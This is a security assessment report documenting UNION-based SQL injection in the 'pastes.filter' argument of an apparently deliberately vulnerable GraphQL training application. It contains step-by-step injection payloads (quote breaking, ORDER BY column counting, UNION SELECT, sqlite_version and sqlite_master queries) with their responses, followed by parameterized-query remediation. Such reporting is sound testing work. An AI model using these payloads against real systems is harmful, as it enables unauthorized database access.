# DVGA-008. SQL Injection via `pastes.filter`

## Severity

Critical

CVSS v3.1 Score: 9.1 (Critical)

Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

## Overall CVSS Calculation

Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
CVSS Base Score:          9.1
Impact Subscore:          5.2
Exploitability Subscore:  3.9
CVSS Temporal Score:      NA
CVSS Environmental Score: NA
Modified Impact Subscore: NA
Overall CVSS Score:       9.1

## CWE

CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)

## OWASP Mapping

* OWASP Top 10 2021: A03. Injection

## Affected Endpoint

* `POST /graphql`

## Affected GraphQL Operation

* `pastes`

## Affected GraphQL Argument

* `pastes.filter`

## Description

The `filter` argument of the `pastes` GraphQL operation is vulnerable to SQL Injection.

While testing different GraphQL operations, I was initially looking for command execution or database errors. During testing of the `pastes` operation, I noticed that supplying a single quote in the `filter` argument caused a SQLite syntax error.

The returned error also exposed the SQL query being executed by the application, showing that the supplied `filter` value was being directly incorporated into the SQL statement.

I then continued testing the parameter manually and confirmed that the SQL query could be manipulated using SQL comments, `ORDER BY`, and finally a UNION-based SQL Injection.

An 8-column UNION query was successfully executed, allowing attacker-controlled values to be returned through the GraphQL response. I was also able to retrieve the SQLite version and enumerate a table from the SQLite schema.

## Steps to Reproduce

### 1. Normal Request

A normal request to the `pastes` operation uses a filter such as:

```graphql
query pastes {
    pastes(public: true, limit: 5, filter: "w") {
        burn
        content
        id
        ipAddr
        owner {
            id
            name
        }
        ownerId
        public
        title
        userAgent
    }
}
```

### 2. Trigger a SQLite Error

I changed the `filter` value to:

```text
w'
```

The application returned:

```text
(sqlite3.OperationalError) near "w": syntax error
```

The response also disclosed the SQL query:

```sql
SELECT pastes.id AS pastes_id,
       pastes.title AS pastes_title,
       pastes.content AS pastes_content,
       pastes.public AS pastes_public,
       pastes.user_agent AS pastes_user_agent,
       pastes.ip_addr AS pastes_ip_addr,
       pastes.owner_id AS pastes_owner_id,
       pastes.burn AS pastes_burn
FROM pastes
WHERE pastes.public = 1
  AND pastes.burn = 0
  AND title = 'w'' or content = 'w''
ORDER BY pastes.id DESC
LIMIT ? OFFSET ?
```

This showed that the user-controlled `filter` value was reaching the SQL query and could break the SQL syntax.

### 3. Confirm SQL Comment Manipulation

I then tested:

```text
w'--+
```

The application returned:

```json
{
    "data": {
        "pastes": []
    }
}
```

The request was processed successfully instead of returning the previous SQL syntax error, indicating that the SQL syntax could be manipulated through the `filter` argument.

### 4. Determine the Number of Columns

I tested:

```text
w' order by 9--+
```

The application returned:

```text
1st ORDER BY term out of range - should be between 1 and 8
```

This indicated that the underlying SELECT statement had 8 selectable columns.

I then tested:

```text
w' order by 8--+
```

which executed successfully and returned:

```json
{
    "data": {
        "pastes": []
    }
}
```

### 5. Confirm UNION-Based SQL Injection

I then tested an 8-column UNION query:

```text
w'union select 1,2,3,4,5,6,7,8--+
```

The application returned:

```json
{
    "data": {
        "pastes": [
            {
                "burn": true,
                "content": "3",
                "id": "1",
                "ipAddr": "6",
                "owner": {
                    "id": "7",
                    "name": "Kathy"
                },
                "ownerId": 7,
                "public": true,
                "title": "2",
                "userAgent": "5"
            }
        ]
    }
}
```

This confirmed that the UNION query was successfully executed and that attacker-controlled SQL output could be returned through the GraphQL response.

### 6. Retrieve SQLite Version

I then used:

```text
w'union select 1,2,sqlite_version(),4,5,6,7,8--+
```

The application returned:

```json
{
    "data": {
        "pastes": [
            {
                "content": "3.40.1"
            }
        ]
    }
}
```

The backend database was therefore confirmed to be:

```text
SQLite 3.40.1
```

### 7. Enumerate SQLite Schema Information

I then tested:

```text
w'union select 1,2,name,4,5,6,7,8 FROM sqlite_master WHERE type='table'--+
```

The application returned:

```json
{
    "data": {
        "pastes": [
            {
                "content": "audits"
            }
        ]
    }
}
```

This confirmed that SQLite schema information could also be queried through the vulnerable parameter.

`audits` was identified as a **table name** from `sqlite_master`, rather than the database name.

## Proof of Concept

### SQLite Error

```text
filter: "w'"
```

Result:

```text
sqlite3.OperationalError: near "w": syntax error
```

### SQL Comment Manipulation

```text
filter: "w'--+"
```

Result:

```json
{"data":{"pastes":[]}}
```

### Column Count

```text
filter: "w' order by 9--+"
```

Result:

```text
1st ORDER BY term out of range - should be between 1 and 8
```

```text
filter: "w' order by 8--+"
```

Result:

```json
{"data":{"pastes":[]}}
```

### UNION Injection

```text
filter: "w'union select 1,2,3,4,5,6,7,8--+"
```

Result:

```text
content: "3"
```

### SQLite Version Extraction

```text
filter: "w'union select 1,2,sqlite_version(),4,5,6,7,8--+"
```

Result:

```text
content: "3.40.1"
```

### Schema Enumeration

```text
filter: "w'union select 1,2,name,4,5,6,7,8 FROM sqlite_master WHERE type='table'--+"
```

Result:

```text
content: "audits"
```

## Impact

An attacker who can access the affected GraphQL operation may be able to manipulate the SQL query through the `pastes.filter` argument.

During testing, I was able to:

* Trigger SQLite SQL syntax errors.
* Manipulate the SQL query using SQL comments.
* Determine the number of columns in the underlying query.
* Successfully execute a UNION SELECT query.
* Control values returned through the GraphQL response.
* Execute SQLite functions such as `sqlite_version()`.
* Retrieve the SQLite version (`3.40.1`).
* Enumerate SQLite schema information and identify the `audits` table.

Depending on the privileges of the database connection and the data stored in the application database, this could potentially allow further unauthorized access to database information.

The demonstrated impact in this assessment is limited to the database information that was manually verified.

## Risk Rating

**Critical**

The finding is rated Critical because the user-controlled `pastes.filter` argument can alter the underlying SQL query and was successfully exploited to perform UNION-based SQL Injection and retrieve database-generated and schema information.

## Remediation

The application should never directly concatenate user-controlled input into SQL statements.

Recommended remediation:

1. Use parameterized queries/prepared statements for the `filter` value.
2. Ensure the value is passed to the database as a bound parameter rather than being concatenated into SQL.
3. Avoid constructing raw SQL statements from GraphQL arguments.
4. Review other GraphQL arguments and operations for similar SQL injection issues.
5. Apply appropriate input validation where required.
6. Do not expose raw SQLite/SQLAlchemy errors or generated SQL queries to the client.
7. Return generic application errors instead of database implementation details.

The vulnerable query should conceptually use parameter binding, for example:

```sql
WHERE title = :filter OR content = :filter
```

where `:filter` is supplied as a parameter rather than directly inserted into the SQL statement.

## Evidence

All testing for this finding was performed **manually**.

The complete evidence, including **all requests, responses, and screenshots**, has been saved under:

```text
evidence/DVGA-008-SQL-Injection-via-pastes-filter/
```

The evidence demonstrates the complete manual testing process from the initial SQLite error through successful UNION-based SQL Injection, SQLite version extraction, and schema enumeration.

## References

* CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
* OWASP Top 10 2021: A03 – Injection
